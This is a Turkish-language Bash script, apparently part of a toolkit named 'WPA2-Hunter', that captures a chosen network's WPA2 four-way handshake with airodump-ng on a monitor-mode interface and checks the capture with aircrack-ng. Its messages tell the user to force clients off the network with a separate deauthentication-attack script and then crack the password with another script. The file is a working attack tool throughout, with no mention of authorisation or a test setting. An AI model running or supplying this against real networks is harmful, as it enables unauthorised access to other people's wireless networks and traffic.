#!/bin/bash

# WPA2-Hunter - Handshake Yakalama Scripti
# Hedef ağdan 4-Way Handshake yakalar

set -e

echo "================================================"
echo "   WPA2-Hunter - Handshake Yakalama"
echo "================================================"
echo ""

# Root kontrolü
if [ "$EUID" -ne 0 ]; then
    echo "[!] Bu script root yetkileri gerektirir!"
    echo "    Kullanım: sudo $0"
    exit 1
fi

# Monitor interface tespit
if [ -f /tmp/wpa2hunter_interface.conf ]; then
    MON_INTERFACE=$(cat /tmp/wpa2hunter_interface.conf)
    echo "[*] Monitor interface: $MON_INTERFACE"
else
    read -p "[?] Monitor interface (örn: wlan0mon): " MON_INTERFACE
fi

# Interface kontrolü
if ! iwconfig "$MON_INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
    echo "[!] Hata: $MON_INTERFACE monitor modda değil!"
    exit 1
fi

echo ""
echo "🎯 Hedef Ağ Bilgileri"
echo "---"
read -p "[?] Hedef BSSID (MAC adresi): " TARGET_BSSID
read -p "[?] Hedef Kanal: " TARGET_CHANNEL
read -p "[?] Çıktı dosya adı (örn: capture): " OUTPUT_NAME

# Varsayılan değer
if [ -z "$OUTPUT_NAME" ]; then
    OUTPUT_NAME="capture"
fi

# Çıktı klasörü
CAPTURE_DIR="../captures"
mkdir -p "$CAPTURE_DIR"

echo ""
echo "📡 Yakalama Ayarları:"
echo "   BSSID: $TARGET_BSSID"
echo "   Kanal: $TARGET_CHANNEL"
echo "   Dosya: ${CAPTURE_DIR}/${OUTPUT_NAME}-01.cap"
echo ""

# Config kaydet
echo "$TARGET_BSSID" > /tmp/wpa2hunter_target_bssid.conf
echo "$TARGET_CHANNEL" > /tmp/wpa2hunter_target_channel.conf

echo "⚠️  UYARI: Handshake yakalamak için:"
echo "   1) Hedef ağa bağlı bir cihaz olmalı"
echo "   2) Cihaz bağlantıyı yenilemeli (veya deauth saldırısı yapın)"
echo ""
echo "💡 İpucu: Handshake yakalanınca sağ üst köşede göreceksiniz:"
echo "   [ WPA handshake: $TARGET_BSSID ]"
echo ""
echo "▶️  Başka bir terminalde deauth saldırısı yapabilirsiniz:"
echo "    sudo ./04-deauth-attack.sh"
echo ""

read -p "[?] Yakalamayı başlatmak için Enter'a basın..."

echo ""
echo "[*] Paket yakalama başlatılıyor..."
echo "[*] Durdurmak için Ctrl+C basın"
echo ""

# Handshake yakalama
cd "$CAPTURE_DIR"
airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$OUTPUT_NAME" "$MON_INTERFACE"

echo ""
echo "[*] Yakalama durduruldu."
echo ""

# Handshake kontrolü
if [ -f "${OUTPUT_NAME}-01.cap" ]; then
    echo "[*] Handshake doğrulama yapılıyor..."
    
    # Aircrack-ng ile kontrol
    if aircrack-ng "${OUTPUT_NAME}-01.cap" 2>&1 | grep -q "1 handshake"; then
        echo ""
        echo "✅ BAŞARILI! Handshake yakalandı!"
        echo ""
        echo "📁 Dosya: ${CAPTURE_DIR}/${OUTPUT_NAME}-01.cap"
        echo ""
        echo "▶️  Şimdi parola kırmaya geçebilirsiniz:"
        echo "    sudo ./05-crack-password.sh"
        echo ""
    else
        echo ""
        echo "⚠️  Handshake yakalanmamış olabilir"
        echo "[*] Şunları deneyin:"
        echo "    1) Deauth saldırısı yapın (04-deauth-attack.sh)"
        echo "    2) Daha uzun süre bekleyin"
        echo "    3) İstemcinin aktif olduğundan emin olun"
        echo ""
    fi
else
    echo "[!] Hata: .cap dosyası oluşturulamadı"
fi
